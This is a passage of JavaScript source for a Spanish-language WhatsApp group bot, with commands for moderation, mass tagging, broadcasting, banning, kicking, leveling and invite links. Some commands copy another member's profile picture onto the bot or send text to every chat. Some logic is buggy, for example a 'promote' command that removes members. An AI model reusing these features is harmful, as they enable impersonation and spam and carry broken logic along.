break
case 'antiestranjeros':                
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para activar, 0 para desactivar`)
if (args[0] === '1') {                                    
if (isEstranjeros) return reply(idiomas.yaesta())          
_estranjerosnot.push(from)                          
fs.writeFileSync('./basededatos/json/estranjerosnot.json', JSON.stringify(_estranjerosnot))      
reply(`*[ ✓ ] Activado*`)
} else if (args[0] === '0') {             
var ini = _estranjerosnot.indexOf(from)
_estranjerosnot.splice(ini, 1)           
fs.writeFileSync('./basededatos/json/estranjerosnot.json', JSON.stringify(_estranjerosnot))       
reply(`*[ ! ] Desactivado*`)              
} else {                                         
reply('1 para activar, 0 para desactivar')           
}
break
case 'respeto':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "sis") {
if (!isBadWord) return reply(`Modo respeto activado en el grupo *${groupMetadata.subject}* :)`)
badword.push(from)
fs.writeFileSync("./basededatos/json/badword.json",JSON.stringify(badword))
reply(`Modo respeto activado en el grupo *${groupMetadata.subject}* :)`)
teslagod.sendMessage(from,`𝙿𝚘𝚛??𝚊𝚟𝚘𝚛 𝚜𝚎𝚊 𝚛𝚎𝚜𝚙𝚎𝚝𝚞𝚘𝚜𝚘 𝚢 𝚗𝚘 𝚞s𝚎 𝚕𝚎𝚗𝚐𝚞𝚊𝚓𝚎 𝚟𝚞𝚕𝚐𝚊𝚛`, text)
} else if (args[0] == "non") {
badword.splice(from, 1)
fs.writeFileSync("./basededatos/json/badword.json",JSON.stringify(badword))
reply(`Modo respeto desactivado en el grupo`)
} else if (!UwU) {
sendButMessage(from, `_*[MODO RESPETO]*_`, `Matt_M ✓`, [{buttonId: `${prefix}respeto sis`,buttonText: {displayText: idiomas.activar() + `😇] >`,},type: 1,},{buttonId: `${prefix}respeto non`,buttonText: {displayText: idiomas.desactivar() + `😈] >`,},type: 1,},])
}
break
case 'nivelear':
case 'levelear':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "infinito") {
if (isLevelingOn) return reply(idiomas.yaesta())
_leveling.push(groupId)
fs.writeFileSync("./basededatos/usuariosnius/leveling.json",JSON.stringify(_leveling))
reply(idiomas.levelon())
} else if (args[0] == "finito") {
_leveling.splice(groupId, 1)
fs.writeFileSync("./basededatos/usuariosnius/leveling.json",JSON.stringify(_leveling))
reply(idiomas.leveloff())
} else if (!UwU) {
sendButMessage(from, `_*[NIVELEAR]*_`, `Matt_M ✓`, [{buttonId: `${prefix}levelear infinito`,buttonText: {displayText: idiomas.activar() + `➕] >`,},type: 1,},{buttonId: `${prefix}levelear finito`,buttonText: {displayText: idiomas.desactivar() + `➖] >`,},type: 1,},])
}
break
/////FIN DE ACTIVADORES
case 'bloqueados': //Lista de los contactos bloqueados por el bot
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
teks = idiomas.Bloqueads() + ':\n    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌\n'
for (let block of blocked) {
teks += `*[ ! ]* ~@${block.split('@')[0]}~\n`
}
teks += `*Total* : ${blocked.length}`
teslagod.sendMessage(from, teks.trim(), extendedText, {quoted: estadouwur1, contextInfo: {"mentionedJid": blocked}})
break
case 'miwasa':
case 'wame':
case 'wa.me':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
options = {
text: idiomas.wame(sender, pushname),
contextInfo: { mentionedJid: [sender] }}
teslagod.sendMessage(from, options, text, { quoted: estarder } )
break
case 'milimite':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
var found = false
const limidat = JSON.parse(fs.readFileSync('./basededatos/json/limit.json'))
for (let lmt of limidat) {
if (lmt.id === sender) {
let limitCounts = limitt - lmt.limit
if (limitCounts <= 0) return reply(from,`Tu límite se ha agotado`, id)
await reply(`*Tu limite restante es : ${limitCounts}*`)
found = true}
}
if (found === false) {
let obj = { id : sender, limit : 1 }
limit.push(obj);
fs.writeFileSync('./basededatos/json/limit.json', JSON.stringify(limit, 1));
await reply(`Tu limite restante es: ${limitCounts}`)
}
break
case 'reiniciarlimite':
if (isBaneado) return
if (!Matt_M && !autonomo) return reply(idiomas.ownerB())
var obj = []
fs.writeFileSync('./basededatos/json/limit.json', JSON.stringify(obj))
await reply(`Se reiniciaron los limites con exito ✓`)
break
case 'minivel':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isLevelingOn) return reply(`*Nivel no activado [ ! ]*`)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
sem = sender.replace('@s.whatsapp.net','')
resul = `┏━━━━❉ *Nivel* ❉━━━━\n┣⊱ Nombre: ${pushname}\n┣⊱ XP conseguido asta el momento:  ${userXp}\n┣⊱ Su nivel actual es: ${userLevel}\n┣⊱ De acuerdo a tu nivel eres: ${role}\n┗━━━━━━━━━━━━━`
teslagod.sendMessage(from, resul, text, { quoted: estarder})
.catch(async (err) => {
console.error(err)
await reply(`Error!\n${err}`)
})
break
case 'suprimir':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isGroup) return reply(idiomas.group())
teslagod.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break
case 'buscamsj': //Buscador de mensajes en un chat
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isGroup) return reply(idiomas.group())
if(!UwU)return reply(idiomas.sherlok())
let v = await teslagod.searchMessages(UwU,from,10,1)
let s = v.messages
let el = s.filter(v => v.message)
el.shift()
try {
if(el[0].message.conversation == undefined) return
reply(idiomas.sherlok2() + `${el.length} ` + idiomas.sherlok3())
for(let i = 0; i < el.length; i++) {
await teslagod.sendMessage(from,'*[✓]*',text,{quoted:el[i]})
}
} catch(e){
reply(idiomas.sherlok4())
}           
break
///Ajustes en grupos///
case 'cgpen':
if (isBaneado) return
if (args.length < 1) return reply(idiomas.cgpent(prefix))
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroup) return reply(idiomas.group())
teslagod.updatePresence(from, Presence.composing) 
if (args[1]=="segundos") {var timer = args[0]+"000"
} else if (args[1]=="minutos") {var timer = args[0]+"0000"
} else if (args[1]=="horas") {var timer = args[0]+"00000"
} else {return reply(idiomas.cgpent2())}
setTimeout( () => {
var nomor = mek.participant
const close = {
text: idiomas.cgpent3(sender),
contextInfo: { mentionedJid: [nomor] }}
teslagod.groupSettingChange (from, GroupSettingChange.messageSend, true)
reply(close)
}, timer)
break
case 'agp':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroup) return reply(idiomas.group())
open = {
text: idiomas.agpt(sender),
contextInfo: { mentionedJid: [sender] }}
teslagod.groupSettingChange (from, GroupSettingChange.messageSend, false)
teslagod.sendMessage(from, open, text, {quoted: mek})
break
case 'editnamegp':
if (isBaneado) return
if (args.length < 1) return reply(idiomas.namegp2())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroup) return reply(idiomas.group())
teslagod.groupUpdateSubject(from, `${body.slice(12)}`)
teslagod.sendMessage(from, idiomas.namegp(), text, {quoted: estadouwur1})
break
case 'editdesgp':
if (isBaneado) return
if (args.length < 1) return reply(idiomas.descgp2())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroup) return reply(idiomas.group())
teslagod.groupUpdateDescription(from, `${body.slice(11)}`)
teslagod.sendMessage(from, idiomas.descgp(), text, {quoted: estadouwur1})
break
case 'perfilbot':
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
teslagod.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return reply(idiomas.niuperfil(prefix))
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(enmedia)
await teslagod.updateProfilePicture(botNumber, media)
reply(idiomas.niuperfil())
break
case 'fotogrupo':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroup) return reply(idiomas.group())
media = await teslagod.downloadAndSaveMediaMessage(mek)
await teslagod.updateProfilePicture (from, media)
reply(idiomas.fotogp())
break
/////ajustes grupo////
case 'infogrupo':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
const nmGp = `${groupName}`
const dcGp = `${groupDesc}`
const admGp = `${groupAdmins.length}`
const itgGp = `${groupMembers.length}`
reply(idiomas.infogp(nmGp, dcGp, admGp, itgGp))
break
case 'creador':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
teslagod.sendMessage(from, {displayname: "jeff", vcard: vcard}, MessageType.contact, { quoted: mek, contextInfo:{externalAdReply: {title: 'Matt_M ✓', body: idiomas.sexy7w7(), sourceUrl: `${creadoruwu}`, thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
break
case 'cocreador':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
teslagod.sendMessage(from, {displayname: "jeff", vcard: vcard1}, MessageType.contact, { quoted: mek})
teslagod.sendMessage(from, `➢ *${command} ${ajustes.recreador}* ` + idiomas.coowner() + `\n\n${ajustes.TusRedesSociales}`,text, { quoted: estadouwur1} )
break
case 'invocar': //tagall, etiqueta a todos los participantes del grupo
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += idiomas.alltag() + `*${pushname}* \n》` + idiomas.alltag2() + `《📡\n𝕋𝕠𝕥𝕒𝕝 : ${groupMembers.length}    ‏  ‌    ‏  ‌\n╔════ஜ۩۞۩ஜ════╗\n`
for (let mem of groupMembers) {
teks += `╠➥ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)}
mentions(`▪︎ `+ teks +'╚═══════════', members_id, true)
break
case 'invocar2': //tagall2, etiqueta a todos los participantes del grupo
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `𝕋𝕠𝕥𝕒𝕝 : ${groupMembers.length}     ‏  ‌    ‏  ‌    ‏  \n`
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)}
teslagod.sendMessage(from, '╔════ஜ۩۞۩ஜ════╗\n╠➥'+teks+'╚═══════════', text, {detectLinks: false, quoted: estadouwur1})
break
case 'invocar3': //tagall3, etiqueta a todos los participantes del grupo
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `𝕋𝕠𝕥𝕒𝕝 : ${groupMembers.length}    ‏  ‌    ‏  ‌\n`
for (let mem of groupMembers) {
teks += `╠➥ ${mem.jid.split('@')[0]}@c.us\n`
members_id.push(mem.jid)}
teslagod.sendMessage(from, '╔════ஜ۩۞۩ஜ════╗\n╠➥'+teks+'╚═══════════', text, {quoted: estadouwur1})
break
case 'invocar4': //tagall4, etiqueta a todos los participantes del grupo
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `𝕋𝕠𝕥𝕒𝕝 : ${groupMembers.length}    ‏  ‌    ‏  ‌\n`
for (let mem of groupMembers) {
teks += `╠➥ ${mem.jid.split('@')[0]}@s.whatsapp.net\n`
members_id.push(mem.jid)}
reeply('╔════ஜ۩۞۩ஜ════╗\n╠➥'+teks+'╚═══════════')
break
case 'bc': //broadcast, transmite un mensaje a todos tus grupos y contactos
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (args.length < 1) return reply(idiomas.Bcast())
anu = await teslagod.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
buff = await teslagod.downloadMediaMessage(encmedia)
for (let _ of anu) {
teslagod.sendMessage(_.jid, buff, image, {caption: `${body.slice(4)}`})}
reply(idiomas.Bcast2())
} else {
for (let _ of anu) {
sendMess(_.jid, `${body.slice(4)}`)
}
reply(idiomas.Bcast2())
}
break
case 'ascender': //Convertir administrador a un participante del grupo
case 'darpoder':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = idiomas.admin1()
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
teslagod.groupRemove(from, mentioned)
} else {
mentions(idiomas.admin2() + ` @${mentioned[0].split('@')[0]}` + idiomas.admin3(), mentioned, true)
teslagod.groupMakeAdmin(from, mentioned)
}
break
case 'degradar': //Quitar administración a un participante
case 'quitarpoder':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(idiomas.admin4())
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = idiomas.admin5()
for (let _ of mentioned) {
teks += idiomas.admin6() + `\n@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
teslagod.groupRemove(from, mentioned)
} else {
mentions(idiomas.admin7() + ` @${mentioned[0].split('@')[0]} [✓]`, mentioned, true)
teslagod.groupDemoteAdmin(from, mentioned)
}
break
case 'banear':
if (isBaneado) return
teslagod.updatePresence(from, Presence.composing) 
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.banearr())
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
addBanned(mentioned[0], args[1], _ban)
}
mentions(idiomas.banear() + ` @${mentioned[0].split('@')[0]} ` + idiomas.banear2(), mentioned, true)
} else if (isQuotedMsg) {
if (quotedMsg.sender.match('51995386439')) return reply(`ª`)
addBanned(quotedMsg.sender, args[1], _ban)
mentions(idiomas.banear() + ` @${mentioned[0].split('@')[0]} ` + idiomas.banear2(), mentioned, true)
} else if (!isNaN(args[1])) {
addBanned(args[1] + '@s.whatsapp.net', args[2], _ban)
mentions(idiomas.banear() + ` @${mentioned[0].split('@')[0]} ` + idiomas.banear2(), mentioned, true)
}
break
case 'quitarbaneo':
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
unBanned(mentioned[i], _ban)
}
mentions(idiomas.banear4() + ` @${mentioned[0].split('@')[0]} `, mentioned, true)
}if (isQuotedMsg) {
unBanned(quotedMsg.sender, _ban)
mentions(idiomas.banear4() + ` @${mentioned[0].split('@')[0]} `, mentioned, true)
} else if (!isNaN(args[0])) {
unBanned(args[0] + '@s.whatsapp.net', _ban)
mentions(idiomas.banear4() + ` @${mentioned[0].split('@')[0]} `, mentioned, true)
}
break
case 'desterrar': //eliminar a un participante del grupo etiquetandolo
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(idiomas.elimin())
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = idiomas.despedida()
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
teslagod.groupRemove(from, mentioned)
} else {
mentions(idiomas.despedida() + ` @${mentioned[0].split('@')[0]}`, mentioned, true)
teslagod.groupRemove(from, mentioned)
}
break
case 'ban':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
    if (
          mek.message.extendedTextMessage === null ||
          mek.message.extendedTextMessage === undefined
        )
          return;
        if (
          mek.message.extendedTextMessage.contextInfo.participant === undefined
        ) {
          entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah[0] == teslagod.user.jid) return
          if (entah.length > 1) {
            var mems_ids = []
            for (let ids of entah) {
              mems_ids.push(ids)
            }
            funar(from, mems_ids)
          } else {
            teslagod.groupRemove(from, [entah[0]])
          }
        } else {
          entah = mek.message.extendedTextMessage.contextInfo.participant;
          funar(from, [entah])
        }
        break
case 'admins': //etiqueta a todos los admins de un grupo
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
teks = idiomas.admingod() + ` *${groupMetadata.subject}*\n\n*_Total_* : *${groupAdmins.length}*\n    ‏  ‌    ‏  ‌\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `🛡 [${no.toString()}] ⚡ @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
break
case 'grupolink': //Envia el link del grupo
case 'gplink':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
linkgc = await teslagod.groupInviteCode(from)
reeply(idiomas.gplinkk() + '\n~> https://chat.whatsapp.com/'+linkgc+`    ‏  ‌    ‏  ‌\n──────⊹⊱✫⊰⊹──────\nhttps://nekosmic.wordpress.com/`)
break
case 'fotocloner':
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.clonerr(prefix))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(idiomas.clonerr2())
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await teslagod.getProfilePicture(id)
buffer = await getBuffer(pp)
teslagod.updateProfilePicture(botNumber, buffer)
mentions(idiomas.clonerr3() + ` @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply(idiomas.clonerr4())
}
break
case '.': //El hidetag resumido, etiqueta a todos sin el @ atravez de un texto :v
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args.length < 1) return reply(idiomas.alltag3(prefix))
var value = args.join(" ")
var group = await teslagod.groupMetadata(from)
var member = group["participants"]
var mem = []
member.map(async (adm) => {
mem.push(adm.id.replace("c.us", "s.whatsapp.net"))})
var hidetagbruh = {
text: value,
contextInfo: { mentionedJid: mem },quoted: mek,}
